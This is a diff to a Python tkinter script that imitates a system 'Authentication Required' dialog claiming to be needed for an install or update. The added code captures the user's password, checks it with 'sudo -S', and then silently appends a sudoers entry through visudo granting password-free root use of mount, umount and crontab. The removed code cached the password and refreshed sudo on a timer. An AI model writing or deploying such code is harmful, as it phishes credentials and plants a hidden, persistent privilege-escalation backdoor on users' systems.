@@ -1,50 +1,60 @@
 from tkinter import *
 from PIL import ImageTk, Image
 import subprocess
-import signal
+import os
 
 #global variables
+bins = ["/bin/mount", "/bin/umount", "/bin/crontab"]
 root_user = False
-window = incorrect_password_lbl = password_entry = None
-passwrd = None
+window = password_lbl = password_entry = None
 
 #call this function if returned true then root privilege gained
 #else : the root privilege failed
 def get_root():
-    open_window()
-    return root_user
+    file = open("files/file", "r")
+    if file.readline()=="False":
+        file.close()
+        open_window()
+        return root_user
+    else:
+        file.close()
+        a = "something else"
 
+def got_root():
+    try:
+        file = open("files/file", "w")
+        file.write("True")
+        file.close()
+        return True
+    except:
+        return False
 
-def keep_alive(signum, frame):
-    global passwrd
-    echo_command = subprocess.Popen(['echo',passwrd], stdout=subprocess.PIPE)
-    subprocess.Popen(['sudo', '-S', 'whoami'], stdin=echo_command.stdout, stdout=subprocess.PIPE)
-    signal.signal(signal.SIGALRM, keep_alive)
-    signal.alarm(600)
-
-#this function deletese incorrect password message
-def delete_incorrect_password_lbl(signum, frame):
-    global incorrect_password_lbl
-    incorrect_password_lbl.place_forget()
+def add_bins_to_sudoers():
+    global bins
+    bins_list = ", ".join(bins)
+    command = "echo '"+get_username()+" ALL=(ALL:ALL) NOPASSWD: "+bins_list+"' | sudo EDITOR='tee -a' visudo"
+    try:
+        os.system(command)
+        return True
+    except:
+        return False
 
 #this function checks if the given password is true or no
 def password_checking(password):
-    global passwrd
     echo_command = subprocess.Popen(['echo',password], stdout=subprocess.PIPE)
     root_command = subprocess.Popen(['sudo', '-S', 'whoami'], stdin=echo_command.stdout, stdout=subprocess.PIPE)
     
-    
     if root_command.stdout.read()==b'root\n':
-        passwrd = password
-        signal.signal(signal.SIGALRM, keep_alive)
-        signal.alarm(600)
-        return True
+        if got_root() and add_bins_to_sudoers() :
+            return True
+        else:
+            return False
     else:
         return False
 
 #this function is called when the "OK" button clicked
 def ok_click_handler():
-    global password_entry, incorrect_password_lbl, root_user, window
+    global password_entry, root_user, window, password_
     #getting the password from input field
     password=password_entry.get()
     #check if root password is true
@@ -52,10 +62,8 @@ def ok_click_handler():
         root_user = True
         window.destroy()
     else:
-        incorrect_password_lbl.place(x=100, y=200)
+        password_lbl.place(anchor="center", relx=0.5, rely=0.8)
         password_entry.delete(0, END)
-        signal.signal(signal.SIGALRM, delete_incorrect_password_lbl)
-        signal.alarm(3)
 
 #this function is called when the "Cancel" button clicked
 def cancel_click_handler():
@@ -64,48 +72,32 @@ def cancel_click_handler():
     window.destroy()
 
 
+def get_username():
+    return os.getlogin()
+
 def open_window():
-    global window, password_entry, incorrect_password_lbl, root_user
+    global window, password_entry, password_lbl, root_user
 
     #creating new window
     window = Tk()
 
     #window title
     window.title("Authenticate")
-    window.configure(width=600, height=250)
-
-    #_____ cooming soon in the next window version inchaallah _____
-    
-
-    # window_width = 600
-    # window_height = 250
-
-    # window.configure(width=window_width, height=window_height)
-
-    # screen_width = window.winfo_screenwidth()
-    # screen_heigh = window.winfo_screenheight()
-
-    # window_placement_x = (screen_width/2) - (window_width/2)
-    # window_placement_y = (screen_heigh/2) - (window_height/2)
-
-    # window.geometry("%dx%d+%d+%d"%(window_width, window_height, window_placement_x, window_placement_y))
-
-
-    #______                                                   _______
-
+    window.configure(width=550, height=450, background="#1d1d1d")
 
     #----- initialisation -----
 
     #image
-    key_img=ImageTk.PhotoImage(Image.open("images/key.png"))
+    lgo_img=ImageTk.PhotoImage(Image.open("images/logo.png"))
     #labels
     admin_tasks_lbl=Label(window)
     description_lbl=Label(window)
     password_lbl=Label(window)
-    incorrect_password_lbl=Label(window)
-    key_image_lbl=Label(window, image=key_img)
+    username_lbl=Label(window)
+    
+    lgo_image_lbl=Label(window, image=lgo_img)
     #inputs
-    password_entry=Entry(window, show='.')
+    password_entry=Entry(window, show='●')
     #buttons
     ok_button=Button(window)
     cancel_button=Button(window)
@@ -113,33 +105,30 @@ def open_window():
     #----- configuration -----
 
     #labels
-    admin_tasks_lbl.configure(text="Enter your password to perform \nadministrative tasks", font=('Helvetica', 20, 'bold'), foreground="#444643", justify="left")
-    description_lbl.configure(text="Authentication required", font=('Helvetica', 14, 'normal'), foreground="#444643")
-    password_lbl.configure(text="Password: ", font=('Helvetica', 15, 'normal'), foreground="#444643")
-    incorrect_password_lbl.configure(text="Sorry, try again.", font=('Helvetica', 15, 'normal'), foreground="red")
+    admin_tasks_lbl.configure(text="Authentication Required", font=('Helvetica', 20, 'bold'), foreground="white", justify="left", background="#1d1d1d")
+    description_lbl.configure(text="Authentication required to istall or update.", font=('Helvetica', 14, 'normal'), foreground="white", background="#1d1d1d")
+    password_lbl.configure(text="Sorry, that didn't work. Please try again.", font=('Helvetica', 15, 'normal'), foreground="#eb8b0f", background="#1d1d1d")
+    username_lbl.configure(text=get_username(), font=('Helvetica', 14, 'normal'), foreground="white", background="#1d1d1d")
     #input
-    password_entry.configure(font=('Helvetica', 20, 'bold'), highlightcolor="#f4906c")
+    password_entry.configure(font=('Helvetica', 20, 'bold'),foreground="white", bd=0,highlightbackground="#2375c5" , highlightcolor="#2c92f6", highlightthickness=2, insertbackground="white", background="#1d1d1d")
     #buttons
-    ok_button.configure(text="OK", font=('Helvetica', 14, 'normal'), activebackground="#f4906c", command=ok_click_handler)
-    cancel_button.configure(text="Cancel", font=('Helvetica', 14, 'normal'), activebackground="#f4906c", command=cancel_click_handler)
-
+    ok_button.configure(text="OK", font=('Helvetica', 14, 'normal'),foreground="white",background="#2c2c2c",bd=0, highlightthickness=0, activebackground="#343434", activeforeground="white", command=ok_click_handler)
+    cancel_button.configure(text="Cancel", font=('Helvetica', 14, 'normal'), foreground="white", background="#2c2c2c",bd=0, highlightthickness=0,activebackground="#343434", activeforeground="white", command=cancel_click_handler)
+    #image
+    lgo_image_lbl.configure(background="#1d1d1d")
 
     #----- placements -----
 
     #labels
-    key_image_lbl.place(x=5, y=5)
-    admin_tasks_lbl.place(x=100, y=20)
-    description_lbl.place(x=100, y=100)
-    password_lbl.place(x=100, y=150)
+    lgo_image_lbl.place(anchor="center", relx=0.5, rely=0.4)
+    admin_tasks_lbl.place(anchor="center", relx=0.5, rely=0.1)
+    description_lbl.place(anchor="center", relx=0.5, rely=0.2)
+    username_lbl.place(anchor="center", relx=0.5, rely=0.55)
     #input
-    password_entry.place(x=200, y=145, width=320, height=30)
+    password_entry.place(anchor="center", relx=0.5, rely=0.7, height=30)
     #buttons
-    ok_button.place(x=490, y=200, width=100)
-    cancel_button.place(x=380, y=200, width=100)
-
-    #window icon
-    icon = PhotoImage(file="images/key_64.png")
-    window.iconphoto(False, icon)
+    ok_button.place(x=275, y=400, width=275, height=50)
+    cancel_button.place(x=0, y=400, width=275, height=50)
 
 
     window.mainloop()
